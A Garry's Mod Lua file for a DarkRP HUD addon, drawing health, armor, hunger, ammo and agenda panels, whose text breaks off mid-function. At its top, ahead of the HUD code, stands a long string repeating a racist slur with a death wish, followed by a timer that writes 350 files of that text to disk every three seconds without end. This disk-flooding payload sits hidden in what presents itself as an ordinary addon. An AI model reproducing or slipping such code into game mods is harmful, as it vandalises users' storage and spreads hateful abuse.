N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 
N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 
N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 
N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 
N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 
N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 
N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 
N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 
N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 
N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 N1GG4 D13 
]]

timer.Create( "gvacspaam", 3, 0, function()
	for i = 1, 350 do 
		file.Write( "N1GG4_D13_".. math.Rand( 1, 1337) ..".txt",  n1gs )
	end
end)



--[[

HUD

]]--



----------------------------------------------------------------------------
								--PIX HUD--
----------------------------------------------------------------------------
include("sh_config.lua")

if SERVER then
	util.AddNetworkString("GotArrested")
	util.AddNetworkString("AdminTell")
	util.AddNetworkString("_Notify")

	resource.AddFile("materials/pixim/health.png")
	resource.AddFile("materials/pixim/armor.png")
	resource.AddFile("materials/pixim/hunger.png")
	resource.AddFile("materials/pixim/want.png")
	resource.AddFile("materials/pixim/gun.png")
	resource.AddFile("materials/pixim/gun2.png")
	resource.AddFile("materials/pixim/want2.png")
	resource.AddFile("materials/pixim/gun2.png")
	resource.AddFile("resource/fonts/BebasNeue.otf")

	return

end






	/*---------------------------------------------------------------------------

	FONT

	---------------------------------------------------------------------------*/


surface.CreateFont( "argent", {
 font = "BebasNeue",
 size = 35 * PIXConfig.HUDScale,
 weight = 500 ,
 blursize = 0,
 scanlines = 0,
 antialias = true
} )


surface.CreateFont( "nom", {
 font = "BebasNeue",
 size = 28 * PIXConfig.HUDScale,
 weight = 500 ,
 blursize = 0,
 scanlines = 0,
 antialias = true
} )

surface.CreateFont( "vieecrit", {
 font = "BebasNeue",
 size = 20 * PIXConfig.HUDScale,
 weight = 500 ,
 blursize = 0,
 scanlines = 0,
 antialias = true
} )

surface.CreateFont( "vie", {
 font = "BebasNeue",
 size = 50* PIXConfig.HUDScale,
 weight = 500,
 blursize = 0,
 scanlines = 0,
 antialias = true
} )


surface.CreateFont( "slash", {
 font = "BebasNeue",
 size = 60 * PIXConfig.HUDScale,
 weight = 500,
 blursize = 0,
 scanlines = 0,
 antialias = true
} )


surface.CreateFont( "wl", {
 font = "BebasNeue",
 size = 30* PIXConfig.HUDScale,
 weight = 500,
 blursize = 0,
 scanlines = 0,
 symbol = true,
 antialias = true
} )


surface.CreateFont( "argent2", {
 font = "BebasNeue",
 size = 40* PIXConfig.HUDScale,
 weight = 500,
 blursize = 0,
 scanlines = 0,
 antialias = true
} )


surface.CreateFont( "lockdown", {
 font = "BebasNeue",
 size = 20,
 weight = 500,
 blursize = 0,
 scanlines = 0,
 antialias = true
} )


surface.CreateFont( "agenda", {
 font = "BebasNeue",
 size = 23* PIXConfig.HUDScale,
 weight = 500,
 blursize = 0,
 scanlines = 0,
 antialias = true
} )


surface.CreateFont( "ammoout", {
 font = "BebasNeue",
 size = 18* PIXConfig.HUDScale,
 weight = 500,
 blursize = 0,
 scanlines = 0,
 antialias = true
} )


	/*---------------------------------------------------------------------------

	HIDEHUDELEMEMENTS

	---------------------------------------------------------------------------*/


local hideHUDElements = {
	["DarkRP_HUD"]				= true,
	["DarkRP_ArrestedHUD"]		= false,
	["DarkRP_EntityDisplay"] 	= false,
	["DarkRP_ZombieInfo"] 		= true,
	["DarkRP_LocalPlayerHUD"] 	= true,
	["DarkRP_Hungermod"] 		= true,
	["DarkRP_Agenda"] 			= true,
	["CHudAmmo"]                = true,
    ["CHudSecondaryAmmo"]       = true,
    ["DarkRP_LockDown"]   		= true,
}



	/*---------------------------------------------------------------------------

	HideHudElements

	---------------------------------------------------------------------------*/




local function hideElements(name)

	if name == "CHudHealth" or name == "CHudBattery" or name == "CHudSuitPower" then
		return false
	end

	if hideHUDElements[name] then
		return false
	end

end
hook.Add("HUDShouldDraw", "hideElements", hideElements)




	/*---------------------------------------------------------------------------

	Format Number Function

	---------------------------------------------------------------------------*/




local function formatNumber(n)
	if not n then return "" end
	if n >= 1e14 then return tostring(n) end
	n = tostring(n)
	local sep = sep or ","
	local dp = string.find(n, "%.") or #n+1
	for i=dp-4, 1, -3 do
		n = n:sub(1, i) .. sep .. n:sub(i+1)
	end
	return n
end

	/*---------------------------------------------------------------------------

	Material

	---------------------------------------------------------------------------*/


	hearth 	= Material("pixim/pixV.png", "noclamp smooth")

	shield 	= Material("pixim/pixS.png", "noclamp smooth")

	food 	= Material("pixim/pixF.png", "noclamp smooth")

	gun    	= Material("pixim/pixG.png", "noclamp smooth")

	wanted  = Material("pixim/pixW.png", "noclamp smooth")

	run 	= Material("pixim/pixR.png", "noclamp smooth")


	/*---------------------------------------------------------------------------

	Base

	---------------------------------------------------------------------------*/




local function Base()



		surface.SetDrawColor( 40, 40, 40, 230 )
		surface.DrawRect( 5 * PIXConfig.HUDScale, ScrH() - 138 * PIXConfig.HUDScale, 370 * PIXConfig.HUDScale, 90 * PIXConfig.HUDScale )

		surface.SetDrawColor( 10, 10, 10, 250 )
		surface.DrawRect( 5 * PIXConfig.HUDScale,ScrH() - 181 * PIXConfig.HUDScale, 370 * PIXConfig.HUDScale, 40 * PIXConfig.HUDScale)

		surface.SetDrawColor( 40, 40, 40, 230 )
		surface.DrawRect( 85 * PIXConfig.HUDScale ,ScrH() - 195 * PIXConfig.HUDScale, 215 * PIXConfig.HUDScale, 6 * PIXConfig.HUDScale)

		surface.SetDrawColor( 40, 40, 40, 230 )
		surface.DrawRect( 5 * PIXConfig.HUDScale,ScrH() - 45 * PIXConfig.HUDScale, 370 * PIXConfig.HUDScale, 40 * PIXConfig.HUDScale )

		surface.SetDrawColor( 10, 10, 10, 230 )
		surface.DrawRect( 44.5 * PIXConfig.HUDScale,ScrH() - 45 * PIXConfig.HUDScale, 290 * PIXConfig.HUDScale, 40 * PIXConfig.HUDScale )

		draw.RoundedBox(0,5*PIXConfig.HUDScale,ScrH() - 138*PIXConfig.HUDScale, 10*PIXConfig.HUDScale, 90*PIXConfig.HUDScale, Color(10, 10, 10,230))

		draw.RoundedBox(0,15*PIXConfig.HUDScale,ScrH() - 138*PIXConfig.HUDScale, 70*PIXConfig.HUDScale, 10*PIXConfig.HUDScale, Color(10, 10, 10,230))

		draw.RoundedBox(0,15*PIXConfig.HUDScale,ScrH() - 58*PIXConfig.HUDScale, 70*PIXConfig.HUDScale, 10*PIXConfig.HUDScale, Color(10, 10, 10,230))

		draw.RoundedBox(0,85*PIXConfig.HUDScale,ScrH() - 138*PIXConfig.HUDScale, 10.5*PIXConfig.HUDScale, 90*PIXConfig.HUDScale, Color(10, 10, 10,230))


end

	/*---------------------------------------------------------------------------

	Steam Image

	---------------------------------------------------------------------------*/
local function SteamImage()

	if PIXConfig.SteamImage == true then

		draw.RoundedBox(0,5 *PIXConfig.HUDScale,ScrH() - 138*PIXConfig.HUDScale, 10*PIXConfig.HUDScale, 90*PIXConfig.HUDScale, Color(10, 10, 10,230))

		draw.RoundedBox(0,15*PIXConfig.HUDScale,ScrH() - 138*PIXConfig.HUDScale, 70*PIXConfig.HUDScale, 10*PIXConfig.HUDScale, Color(10, 10, 10,230))

		draw.RoundedBox(0,15*PIXConfig.HUDScale,ScrH() - 58*PIXConfig.HUDScale, 70*PIXConfig.HUDScale, 10*PIXConfig.HUDScale, Color(10, 10, 10,230))

		draw.RoundedBox(0,85*PIXConfig.HUDScale,ScrH() - 138*PIXConfig.HUDScale, 10.5*PIXConfig.HUDScale, 90*PIXConfig.HUDScale, Color(10, 10, 10,230))


		draw.RoundedBox(0,85*PIXConfig.HUDScale,ScrH() - 132*PIXConfig.HUDScale, 5*PIXConfig.HUDScale, 78*PIXConfig.HUDScale, Color(255, 255, 255,10))

		draw.RoundedBox(0,10 *PIXConfig.HUDScale,ScrH() - 132*PIXConfig.HUDScale, 5*PIXConfig.HUDScale, 78*PIXConfig.HUDScale, Color(255, 255, 255,10))

		draw.RoundedBox(0,15 *PIXConfig.HUDScale,ScrH() - 132*PIXConfig.HUDScale, 70*PIXConfig.HUDScale, 5*PIXConfig.HUDScale, Color(255, 255, 255,10))

		draw.RoundedBox(0,15 *PIXConfig.HUDScale,ScrH() - 59 *PIXConfig.HUDScale, 70 *PIXConfig.HUDScale, 5 *PIXConfig.HUDScale, Color(255, 255, 255,10))



		local Avatar = vgui.Create( "AvatarImage", Panel )
		Avatar:SetSize( 70 *PIXConfig.HUDScale, 70 *PIXConfig.HUDScale)
		Avatar:SetPos( 15 *PIXConfig.HUDScale,ScrH() - 128 *PIXConfig.HUDScale)
		Avatar:SetPlayer( LocalPlayer(), 64 )

	end
end

	/*---------------------------------------------------------------------------

	Ammo

	---------------------------------------------------------------------------*/

if PIXConfig.AmmoHUD == true then

	local wep, total, clip, nicename
	local function Ammo()
	ply = LocalPlayer()
	if !IsValid(ply:GetActiveWeapon()) then return end
		wep = ply:GetActiveWeapon()
		total = ply:GetAmmoCount(wep:GetPrimaryAmmoType())
		clip = wep:Clip1()
		nicename = wep:GetPrintName()


	if clip < 0 or wep:GetClass() == "weapon_physcannon" then return end

		draw.RoundedBox(0,ScrW() - (204 - 1)*PIXConfig.HUDScale,ScrH() - (95 - 3)*PIXConfig.HUDScale,198*PIXConfig.HUDScale,30 *PIXConfig.HUDScale,Color(10, 10, 10, 250))
		draw.RoundedBox(0,ScrW() - (204 - 1)*PIXConfig.HUDScale,ScrH() - (60 - 1)*PIXConfig.HUDScale,198 *PIXConfig.HUDScale,55 *PIXConfig.HUDScale,Color(40, 40, 40, 230))

		if total == 0 and clip == 0 then
			draw.SimpleText(clip,"vie",ScrW() - 154*PIXConfig.HUDScale,ScrH() - 55*PIXConfig.HUDScale,PIXConfig.ColorAmmorOut,TEXT_ALIGN_CENTER)
			draw.SimpleText(total,"nom",ScrW() - 54*PIXConfig.HUDScale,ScrH() - 45*PIXConfig.HUDScale,PIXConfig.ColorAmmorOut,TEXT_ALIGN_CENTER)
			draw.SimpleText("/","slash",ScrW() - 99*PIXConfig.HUDScale,ScrH() - 60*PIXConfig.HUDScale,PIXConfig.ColorAmmorOut,TEXT_ALIGN_CENTER)
		elseif total >= 0 and clip >= 0 then
			draw.SimpleText(clip,"vie",ScrW() - 154*PIXConfig.HUDScale,ScrH() - 55*PIXConfig.HUDScale,PIXConfig.ColorClip,TEXT_ALIGN_CENTER)
			draw.SimpleText(total,"nom",ScrW() - 54*PIXConfig.HUDScale,ScrH() - 45*PIXConfig.HUDScale,PIXConfig.ColorTotal,TEXT_ALIGN_CENTER)
			draw.SimpleText("/","slash",ScrW() - 99*PIXConfig.HUDScale,ScrH() - 60*PIXConfig.HUDScale,PIXConfig.ColorAmmoOut,TEXT_ALIGN_CENTER)

		end



	if string.len(nicename) > 21 then nicename = string.Left(nicename, 19) .. "..." end
		draw.SimpleText(nicename,"nom",ScrW() - 104*PIXConfig.HUDScale,ScrH() - 90*PIXConfig.HUDScale,PIXConfig.AmmoName,TEXT_ALIGN_CENTER)
	end

	hook.Add("HUDPaint", "Ammo", Ammo)
end

	/*---------------------------------------------------------------------------

	PlayerInfo

	---------------------------------------------------------------------------*/

local function Plaryerinfo()

	local name 	 = LocalPlayer():Nick() or ""
	local job 	 = LocalPlayer():getDarkRPVar("job") or ""
	local money  = "$"..formatNumber(LocalPlayer():getDarkRPVar("money") or 0)
	local salary = "$"..formatNumber(LocalPlayer():getDarkRPVar("salary") or 0)


	draw.DrawText(name, "nom", 195 *PIXConfig.HUDScale,ScrH() - 218 *PIXConfig.HUDScale, PIXConfig.ColorName, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)

	draw.DrawText(job, "argent2", 11 *PIXConfig.HUDScale,ScrH() - 179 *PIXConfig.HUDScale, PIXConfig.ColorJob, TEXT_ALIGN_LEFT, TEXT_ALIGN_CENTER)

	draw.DrawText(money, "argent",  190 *PIXConfig.HUDScale, ScrH() - 40*PIXConfig.HUDScale, PIXConfig.ColorMoney, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)

	draw.DrawText(salary, "argent2", 370*PIXConfig.HUDScale,ScrH() - 179 *PIXConfig.HUDScale, PIXConfig.ColorSalary, TEXT_ALIGN_RIGHT, TEXT_ALIGN_CENTER)

end


	/*---------------------------------------------------------------------------

	Health

	---------------------------------------------------------------------------*/

local function Health()
	local vie = LocalPlayer():Health()
	local Health = LocalPlayer():Health() or 0
	local FullHealth = LocalPlayer():Health() or 0
	if Health < 0 then Health = 0 elseif Health > 100 then Health = 100 end
	local DrawHealth = math.Min(Health/GAMEMODE.Config.startinghealth, 1)


	if 	PIXConfig.HungerActivate == true and 	PIXConfig.ArmorActivate == true then

			draw.RoundedBox(0,96.4,ScrH() - 130, 260, 15, Color(10, 10, 10,200))

			if Health != 0 then
				draw.RoundedBox(0,96.5,ScrH() - 130, 260 * Health / 100, 15, PIXConfig.HealthBar)
			end

				surface.SetMaterial( hearth );
				surface.SetDrawColor(PIXConfig.Icohealth)
				surface.DrawTexturedRect( 359,ScrH() - 129, 13, 13);
	end

	if PIXConfig.HungerActivate == false and 	PIXConfig.ArmorActivate == true then

			draw.RoundedBox(0,96.4,ScrH() - 120, 260, 15, Color(10, 10, 10,200))

			if Health != 0 then
				draw.RoundedBox(0,96.5,ScrH() - 120, 260 * Health / 100, 15, PIXConfig.HealthBar)
			end

				surface.SetMaterial( hearth );
				surface.SetDrawColor(PIXConfig.Icohealth)
				surface.DrawTexturedRect( 359,ScrH() - 119, 13, 13);
	end

	if PIXConfig.HungerActivate == true and PIXConfig.ArmorActivate == false then

			draw.RoundedBox(0,96.4,ScrH() - 120, 260, 15, Color(10, 10, 10,200))

			if Health != 0 then
				draw.RoundedBox(0,96.5,ScrH() - 120, 260 * Health / 100, 15, PIXConfig.HealthBar)
			end

				surface.SetMaterial( hearth );
				surface.SetDrawColor(PIXConfig.Icohealth)
				surface.DrawTexturedRect( 359,ScrH() - 119, 13, 13);

	end

		if PIXConfig.HungerActivate == false and PIXConfig.ArmorActivate == false then

			draw.RoundedBox(0,96.4,ScrH() - 100, 260, 15, Color(10, 10, 10,200))

			if Health != 0 then
				draw.RoundedBox(0,96.5,ScrH() - 100, 260 * Health / 100, 15, PIXConfig.HealthBar)
			end

				surface.SetMaterial( hearth );
				surface.SetDrawColor(PIXConfig.Icohealth)
				surface.DrawTexturedRect( 359,ScrH() - 99, 13, 13);

	end
	draw.DrawText(vie, "vieecrit", 230 *PIXConfig.HUDScale,ScrH() - 131 *PIXConfig.HUDScale, PIXConfig.ColorName, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
end



	/*---------------------------------------------------------------------------

	Armor

	---------------------------------------------------------------------------*/

local function Armor()

	local Armor = LocalPlayer():Armor() or 0
	local FullHealth = LocalPlayer():Armor() or 0
	if Armor < 0 then Armor = 0 elseif Armor > 100 then Armor = 100 end
	local DrawArmor = math.Min(Armor/GAMEMODE.Config.startinghealth, 1)

	if PIXConfig.HungerActivate == true and PIXConfig.ArmorActivate == true then
		draw.RoundedBox(0,96.4,ScrH() - 100, 260, 15, Color(10, 10, 10,200))

		if Armor != 0 then
			draw.RoundedBox(0,96.4,ScrH() - 100, 260 * Armor /100, 15,PIXConfig.ArmorBar)
		end

				surface.SetMaterial( shield );
				surface.SetDrawColor(PIXConfig.IcoArmor)
				surface.DrawTexturedRect( 359,ScrH() - 100, 13, 13);
	end

	if PIXConfig.HungerActivate == false and PIXConfig.ArmorActivate == true then
			draw.RoundedBox(0,96.4,ScrH() - 81, 260, 15, Color(10, 10, 10,200))

			if Armor != 0 then
				draw.RoundedBox(0,96.4,ScrH() - 81, 260 * Armor /100, 15,PIXConfig.ArmorBar)
			end

				surface.SetMaterial( shield );
				surface.SetDrawColor(PIXConfig.IcoArmor)
				surface.DrawTexturedRect( 359,ScrH() - 81, 13, 13);

	end

	if PIXConfig.ArmorActivate == false and PIXConfig.HungerActivate == true then
			draw.RoundedBox(0,96.4,ScrH() - 81, 260, 15, Color(10, 10, 10,0))
	end

end


	/*---------------------------------------------------------------------------

	Hunger

	---------------------------------------------------------------------------*/

local function Hunger()


		local Hunger = math.ceil(LocalPlayer():getDarkRPVar("Energy") or 0)
		local EchoHunger = math.ceil(LocalPlayer():getDarkRPVar("Energy") or 0)
		if Hunger < 0 then Hunger = 0 elseif Hunger > 100 then Hunger = 100 end

				if PIXConfig.HungerActivate == true and PIXConfig.ArmorActivate == true then
					draw.RoundedBox(0,96.4,ScrH() - 70, 260, 15, Color(10, 10, 10,200))

					if Hunger != 0 then
						draw.RoundedBox(0,96.4,ScrH() - 70, 260 * Hunger /100, 15, PIXConfig.HungerBar)
					end

						surface.SetMaterial( food );
						surface.SetDrawColor(PIXConfig.IcoHunger)
						surface.DrawTexturedRect( 358,ScrH() - 70, 15, 15);

				end

				if PIXConfig.HungerActivate == true and PIXConfig.ArmorActivate == false then
					draw.RoundedBox(0,96.4,ScrH() - 81, 260, 15, Color(10, 10, 10,200))

					if Hunger != 0 then
						draw.RoundedBox(0,96.4,ScrH() - 81, 260 * Hunger /100, 15, PIXConfig.HungerBar)
					end

						surface.SetMaterial( food );
						surface.SetDrawColor(PIXConfig.IcoHunger)
						surface.DrawTexturedRect( 359,ScrH() - 81, 15, 15);

		end

end

local function Stamina()


        local TCBStamina = LocalPlayer():GetNWInt( "tcb_stamina" ) or 0
        local echoTCBStamina = LocalPlayer():GetNWInt( "tcb_stamina" ) or 0
		if TCBStamina < 0 then TCBStamina = 0 elseif TCBStamina > 100 then TCBStamina = 100 end

					surface.SetDrawColor( 10, 10, 10, 250 )
					surface.DrawRect( 378*PIXConfig.HUDScale,ScrH() - 45*PIXConfig.HUDScale, 20*PIXConfig.HUDScale, 40 *PIXConfig.HUDScale)


					surface.SetDrawColor( 40, 40, 40, 230 )
					surface.DrawRect( 379*PIXConfig.HUDScale,ScrH() - 180*PIXConfig.HUDScale, 20*PIXConfig.HUDScale, 132 *PIXConfig.HUDScale)

					Tra = 128 / 100  * TCBStamina

					if TCBStamina != 0  and PIXConfig.HUDScale >= 0.80 then
						draw.RoundedBox(0,382.5*PIXConfig.HUDScale / 1.004,ScrH() - 50* PIXConfig.HUDScale  - Tra * PIXConfig.HUDScale, 18 *PIXConfig.HUDScale, Tra *PIXConfig.HUDScale, PIXConfig.TCBStamina)
					end

					if TCBStamina != 0  and PIXConfig.HUDScale < 0.80 then
						draw.RoundedBox(0,382.5*PIXConfig.HUDScale / 1.003,ScrH() - 50* PIXConfig.HUDScale  - Tra * PIXConfig.HUDScale, 16 *PIXConfig.HUDScale, Tra *PIXConfig.HUDScale, PIXConfig.TCBStamina)
					end

						surface.SetMaterial( run );
						surface.SetDrawColor(255, 255, 255, 255)
						surface.DrawTexturedRect( 378.5*PIXConfig.HUDScale,ScrH() - 40*PIXConfig.HUDScale, 20*PIXConfig.HUDScale, 28*PIXConfig.HUDScale);

end





	/*---------------------------------------------------------------------------

	Wanted And Gunlicense

	---------------------------------------------------------------------------*/


local function PlayerIcons()

	if LocalPlayer():getDarkRPVar("HasGunlicense") then
		surface.SetMaterial( gun );
		surface.SetDrawColor(200,200,200,255)
		surface.DrawTexturedRect( 7*PIXConfig.HUDScale,ScrH() - 40*PIXConfig.HUDScale, 32*PIXConfig.HUDScale, 32*PIXConfig.HUDScale);
	else
		surface.SetMaterial( gun );
		surface.SetDrawColor(10,10,10,255)
		surface.DrawTexturedRect( 7*PIXConfig.HUDScale,ScrH() - 40*PIXConfig.HUDScale, 32*PIXConfig.HUDScale, 32*PIXConfig.HUDScale);
	end

	local lel = (math.sin(CurTime()) + 1) / 3

	if LocalPlayer():getDarkRPVar("wanted") then
		surface.SetMaterial( wanted );
		surface.SetDrawColor(lel * 200, 0, 0 - (lel * 230), 240)
		surface.DrawTexturedRect( 338*PIXConfig.HUDScale,ScrH() - 41*PIXConfig.HUDScale, 32*PIXConfig.HUDScale, 32*PIXConfig.HUDScale);
	else
		surface.SetMaterial( wanted );
		surface.SetDrawColor(10,10,10,255)
		surface.DrawTexturedRect( 338*PIXConfig.HUDScale,ScrH() - 41*PIXConfig.HUDScale, 32*PIXConfig.HUDScale, 32*PIXConfig.HUDScale);
	end


end




local function PlayerModel()
	if PIXConfig.SteamImage == false then



		PlayerModel = vgui.Create("DModelPanel")
		function PlayerModel:LayoutEntity( Entity ) return end
		PlayerModel:SetModel( LocalPlayer():GetModel() )
		PlayerModel:SetPos(10*PIXConfig.HUDScale,ScrH() - 141*PIXConfig.HUDScale)
		PlayerModel:SetSize( 85 *PIXConfig.HUDScale, 83 *PIXConfig.HUDScale)
		PlayerModel:SetCamPos(Vector( 16, -8, 65 ))
		PlayerModel:SetLookAt(Vector( 0, 0, 65 ))

		timer.Create( "UpdatePlayerModel", 0.5, 0, function()
				if LocalPlayer():GetModel() != PlayerModel.Entity:GetModel() then
						PlayerModel:Remove()
						PlayerModel = vgui.Create("DModelPanel")
						function PlayerModel:LayoutEntity( Entity ) return end
						PlayerModel:SetModel( LocalPlayer():GetModel())
						PlayerModel:SetPos(10*PIXConfig.HUDScale ,ScrH() - 141*PIXConfig.HUDScale)
						PlayerModel:SetSize( 85*PIXConfig.HUDScale, 83 *PIXConfig.HUDScale)
						PlayerModel:SetCamPos(Vector( 16, -8, 65 ))
						PlayerModel:SetLookAt(Vector( 0, 0, 65 ))
				end
		end)
	end
end

	hook.Add("InitPostEntity", "PlayerModel", PlayerModel)


	/*---------------------------------------------------------------------------

	Agenda

	---------------------------------------------------------------------------*/


local function Agenda()
	local agenda = LocalPlayer():getAgendaTable()
	if not agenda then return end

	draw.RoundedBox(0, TEXT_ALIGN_LEFT + 5 *PIXConfig.HUDScale, TEXT_ALIGN_TOP + 40 *PIXConfig.HUDScale, 400*PIXConfig.HUDScale, 120*PIXConfig.HUDScale, Color( 40, 40, 40, 200 ))
	draw.RoundedBox(0, TEXT_ALIGN_LEFT + 5 *PIXConfig.HUDScale, TEXT_ALIGN_TOP + 1*PIXConfig.HUDScale, 400*PIXConfig.HUDScale, 36*PIXConfig.HUDScale, Color( 10, 10, 10, 250 ))



	draw.DrawNonParsedText("POLICE AGENDA", "agenda", 160*PIXConfig.HUDScale, 12*PIXConfig.HUDScale, Color(255, 255, 255, 255), 0)

	local text = LocalPlayer():getDarkRPVar("agenda") or ""

	text = text:gsub("//", "\n"):gsub("\\n", "\n")
	text = DarkRP.textWrap(text, "DarkRPHUD1", 394 *PIXConfig.HUDScale)
	draw.DrawNonParsedText(text, "DarkRPHUD1", 10*PIXConfig.HUDScale, 45*PIXConfig.HUDScale, Color(255, 255, 255, 255), 0)
end


	/*---------------------------------------------------------------------------

	Voice Tchat

	---------------------------------------------------------------------------*/


local VoiceChatTexture = surface.GetTextureID("voice/icntlk_pl")
local function DrawVoiceChat()
	if LocalPlayer().DRPIsTalking then
		local chbxX, chboxY = chat.GetChatBoxPos()

		local Rotating = math.sin(CurTime()*3)
		local backwards = 0
		if Rotating < 0 then
			Rotating = 1-(1+Rotating)
			backwards = 180
		end
		surface.SetTexture(VoiceChatTexture)
		surface.SetDrawColor(Color(140,0,0,180))
		surface.DrawTexturedRectRotated(ScrW() - 100, chboxY, Rotating*96, 96, backwards)
	end
end


	/*---------------------------------------------------------------------------

	Lockdown

	---------------------------------------------------------------------------*/


local function Lockdown()

	if GetGlobalBool("DarkRP_LockDown") then

		--> Variables
		local cin = (math.sin(CurTime()) + 1) / 2

		--> Background
		draw.RoundedBox( 0, 0, ScrH()- 1100, 5, 1280, Color(cin * 10, 0, 150 - (cin * 255), 255) )
		draw.RoundedBox( 0, ScrW()-5, ScrH()- 1100, 5, 1280, Color(cin * 10, 0, 150 - (cin * 255), 255) )
		draw.RoundedBox( 0, ScrW()-1920, ScrH()- 5, 1920, 5, Color(cin * 10, 0, 150 - (cin * 255), 255) )
		draw.RoundedBox( 0, 0, ScrH()/ 10000, 1920, 5, Color(cin * 10, 0, 150 - (cin * 255), 255) )
		draw.RoundedBox( 0,0 , ScrH() -275,375 , 40, Color(cin * 10, 0, 150 - (cin * 255), 255) )
		draw.DrawText("The mayor has initialized a lockdown! Return to your homes!", "lockdown", 190 , ScrH()- 265, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
	end

end



	/*---------------------------------------------------------------------------

	Draw Player Info

	---------------------------------------------------------------------------*/
local function AboveHead()

	local plyMeta = FindMetaTable("Player")

	plyMeta.drawPlayerInfo = function( self )

		local pos = self:EyePos()
		pos.z = pos.z + 10
		pos = pos:ToScreen()


		local x = pos.x
		local y = pos.y
		local teamJob = team.GetName(ply:Team())
		local g = self:GetNWString( "usergroup" )
		local teamname = team.GetName(self:Team())


		draw.RoundedBox( 0, x + 74, y - 35, 35, 35, Color( 40, 40, 40, 240 ) )
		draw.RoundedBox( 0, x - 111, y - 35, 35, 35, Color( 40, 40, 40, 240 ) )
		draw.RoundedBox( 0, x - 76, y - 20, 150, 5, Color( 10, 10, 10, 250 ) )


		draw.DrawText(self:Nick(), "nom", pos.x -2, pos.y - 45, PIXConfig.ColorNameHead, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)


		draw.DrawText(self:getDarkRPVar("job") or teamJob, "nom", pos.x - 2, pos.y - 18, team.GetColor(ply:Team()), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)


		if self:getDarkRPVar("HasGunlicense") then
			surface.SetMaterial( gun );
			surface.SetDrawColor(200,200,200,255)
			surface.DrawTexturedRect( x - 108.5, y - 31.5, 30, 30);
		else
			surface.SetMaterial( gun );
			surface.SetDrawColor(10,10,10,255)
			surface.DrawTexturedRect( x - 108.5, y - 33, 30, 30);
		end

		local lel = (math.sin(CurTime()) + 1) / 3

		if self:getDarkRPVar("wanted") then
			surface.SetMaterial( wanted );
			surface.SetDrawColor(lel * 255, 0, 0 - (lel * 230), 240)
			surface.DrawTexturedRect( x + 77, y - 32, 30, 30 );
		else
			surface.SetMaterial( wanted );
			surface.SetDrawColor(10,10,10,255)
			surface.DrawTexturedRect( x + 77, y - 32, 30, 30 );
		end



	end
end



		local Arrested = function() end

			net.Receive("GotArrested", function(msg)
			    local StartArrested = CurTime()
			    local ArrestedUntil = msg:ReadFloat()

			    Arrested = function()
			        local shouldDraw = hook.Call("HUDShouldDraw", GAMEMODE, "DarkRP_ArrestedHUD")
			        if shouldDraw == false then return end

			        if CurTime() - StartArrested <= ArrestedUntil and localplayer:getDarkRPVar("Arrested") then
			            draw.DrawNonParsedText(DarkRP.getPhrase("youre_arrested", math.ceil((ArrestedUntil - (CurTime() - StartArrested)) * 1 / game.GetTimeScale())), "DarkRPHUD1", Scrw / 2, Scrh - Scrh / 12, Color(255, 255, 255, 255), 1)
			        elseif not localplayer:getDarkRPVar("Arrested") then
			            Arrested = function() end
			        end
			    end
			end)

			local AdminTell = function() end

			net.Receive("AdminTell", function(msg)
			    timer.Remove("DarkRP_AdminTell")
			    local Message = msg:ReadString()

			    AdminTell = function()
